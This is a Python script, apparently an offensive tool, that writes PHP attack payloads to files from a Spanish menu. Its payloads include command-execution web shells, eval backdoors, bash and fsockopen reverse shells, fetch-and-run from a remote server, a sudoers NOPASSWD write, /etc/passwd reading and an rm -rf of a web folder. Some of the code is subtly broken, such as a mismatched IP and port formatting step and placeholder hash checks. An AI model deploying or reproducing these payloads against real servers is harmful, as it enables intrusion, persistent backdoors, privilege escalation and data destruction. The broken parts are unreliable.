import os

def disclaimer():
    print("\n*******************")
    print("   Herramienta creada por Técnicos en Hacking")
    print("   No nos hacemos responsables del mal uso de esta herramienta.")
    print("   Utilícela solo en entornos controlados y con permiso.")
    print("*******************\n")

def mostrar_menu():
    print("\n******** Generador de Payloads PHP ********")
    print("Selecciona la categoría de payload:")
    print("1. Básico")
    print("2. Medio")
    print("3. Avanzado")
    print("4. Zona de Peligro")
    print("5. Salir")
    return input("Elige la categoría (1-5): ")

def mostrar_opciones(categoria, payloads):
    print(f"\n---- Payloads de Nivel {categoria} ----")
    for i, payload_desc in enumerate(payloads[categoria], 1):
        print(f"{i}. {payload_desc[0]}")
    return input("Selecciona el payload (1-8): ")

def generar_payload(categoria, payload_id, payloads, ip=None, port=None):
    try:
        # Obtener el código del payload según la categoría y el id
        payload_code = payloads[categoria][int(payload_id) - 1][1]
        if "{ip}" in payload_code and "{port}" in payload_code:
            # Formato para shells inversas que requieren IP y puerto
            return payload_code.format(ip, port)
        return payload_code
    except (IndexError, KeyError):
        return None

def main():
    # Definir los payloads directamente dentro de main
    payloads = {
        "Básico": [
            ("Shell básico con shell_exec", "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>"),
            ("Shell básico con system", "<?php echo '<pre>' . system($_GET['cmd']) . '</pre>'; ?>"),
            ("Passthru básico", "<?php passthru($_GET['cmd']); ?>"),
            ("Exec básico", "<?php echo '<pre>' . exec($_GET['cmd']) . '</pre>'; ?>"),
            ("Mostrar configuración PHP", "<?php phpinfo(); ?>"),
            ("Mostrar variables de entorno", "<?php echo '<pre>'; print_r($_ENV); echo '</pre>'; ?>"),
            ("Leer archivo básico", "<?php echo file_get_contents('test.txt'); ?>"),
            ("Escribir en archivo", "<?php echo '<pre>' . file_put_contents('output.txt', $_GET['data']) . '</pre>'; ?>"),
        ],
        "Medio": [
            ("Evaluar comando con contraseña", "<?php if(isset($_REQUEST['pass']) && $_REQUEST['pass'] == 'mypassword') { eval($_REQUEST['cmd']); } ?>"),
            ("Reverse shell en bash", "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'\"); ?>".format("{ip}", "{port}")),
            ("Reverse shell con fsockopen", """<?php
$socket = fsockopen("{ip}", {port});
if ($socket) {
    shell_exec("bash -i <&3 >&3 2>&3");
}
?>"""),
            ("Subir archivo mediante formulario", """<?php
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Archivo subido con éxito.";
}
?>"""),
            ("Evaluar código base64", "<?php eval(base64_decode($_REQUEST['code'])); ?>"),
            ("Listar directorios", "<?php echo '<pre>' . print_r(scandir('/'), true) . '</pre>'; ?>"),
            ("Mostrar cabeceras del servidor", "<?php foreach($_SERVER as $key => $value) echo \"$key => $value\n\"; ?>"),
            ("Listar archivos en directorio", "<?php foreach(glob('*') as $filename) echo $filename . PHP_EOL; ?>"),
        ],
        "Avanzado": [
            ("Eval protegido con hash", """<?php if (hash('sha256', $_GET['pass']) == 'd2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2') { eval($_REQUEST['cmd']); } ?>"""),
            ("Escaneo de puertos", """<?php for($port=1; $port<=65535; $port++){ $connection = @fsockopen("127.0.0.1", $port); if ($connection) { echo "Puerto abierto: $port\n"; fclose($connection); } } ?>"""),
            ("Cargar y ejecutar script remoto", """<?php $data = file_get_contents('http://remote.server/script.php'); eval($data); ?>"""),
            ("Reverse shell con función PHP", """<?php
function reverse_shell() {
    $sock = fsockopen("{ip}", {port});
    shell_exec("/bin/sh -i <&3 >&3 2>&3");
}
reverse_shell();
?>"""),
            ("Mostrar archivo /etc/passwd", """<?php echo file_get_contents("/etc/passwd"); ?>"""),
            ("Deshabilitar restricciones y ejecutar", """<?php ini_set('disable_functions', ''); system($_GET['cmd']); ?>"""),
            ("Mostrar IP del servidor", """<?php echo 'IP del servidor: ' . $_SERVER['SERVER_ADDR']; ?>"""),
            ("Comprobar permisos de escritura", """<?php if(is_writable('.')) { echo "El directorio actual es escribible"; } ?>"""),
        ],
        "Zona de Peligro": [
            ("Eval protegido con hash y clave", """<?php if(isset($_REQUEST['key']) && hash('sha256', $_REQUEST['key']) == 'clave_super_segura') { eval($_REQUEST['code']); } ?>"""),
            ("Explorar directorios críticos", """<?php $files = scandir('/var/www/html/'); foreach($files as $file) { echo $file . PHP_EOL; } ?>"""),
            ("Listar archivos del sistema", """<?php foreach (glob("/var/*") as $filename) { echo $filename; } ?>"""),
            ("Descargar y ejecutar payload", """<?php exec("wget http://servidor_remoto/payload.php -O /tmp/payload.php; php /tmp/payload.php"); ?>"""),
            ("Agregar usuario al sudoers", """<?php file_put_contents('/etc/sudoers', 'www-data ALL=(ALL) NOPASSWD:ALL'); ?>"""),
            ("Extraer configuración sensible", """<?php $config = parse_ini_file('/path/to/config.ini', true); foreach($config as $section => $settings) { echo "$section: $settings\n"; } ?>"""),
            ("Eliminar carpeta crítica", """<?php $commands = ["rm -rf /var/www/html/important_folder"]; foreach ($commands as $cmd) { system($cmd); } ?>"""),
            ("Mantener conexión activa", """<?php ignore_user_abort(true); set_time_limit(0); while(true) { echo 'Manteniendo la conexión activa'; sleep(5); } ?>"""),
        ]
    }

    disclaimer()
    while True:
        categoria_opcion = mostrar_menu()
        
        if categoria_opcion == '5':
            print("Saliendo del generador de payloads.")
            break
        elif categoria_opcion in ['1', '2', '3', '4']:
            categorias = {"1": "Básico", "2": "Medio", "3": "Avanzado", "4": "Zona de Peligro"}
            categoria = categorias[categoria_opcion]
            payload_id = mostrar_opciones(categoria, payloads)
            
            if categoria in ["Medio", "Avanzado", "Zona de Peligro"] and payload_id in ['2', '3', '4']:
                ip = input("Introduce la IP para la shell inversa: ")
                port = input("Introduce el puerto para la shell inversa: ")
                payload = generar_payload(categoria, payload_id, payloads, ip, port)
            else:
                payload = generar_payload(categoria, payload_id, payloads)
                
            if payload:
                filename = f"{categoria.lower()}_{payload_id}.php"
                with open(filename, "w") as f:
                    f.write(payload)
                print(f"\nPayload '{filename}' generado exitosamente en el directorio actual.\n")
            else:
                print("Opción de payload inválida. Inténtalo de nuevo.")
        else:
            print("Opción de categoría no válida. Inténtalo de nuevo.")

if __name__ == "__main__":
    main()
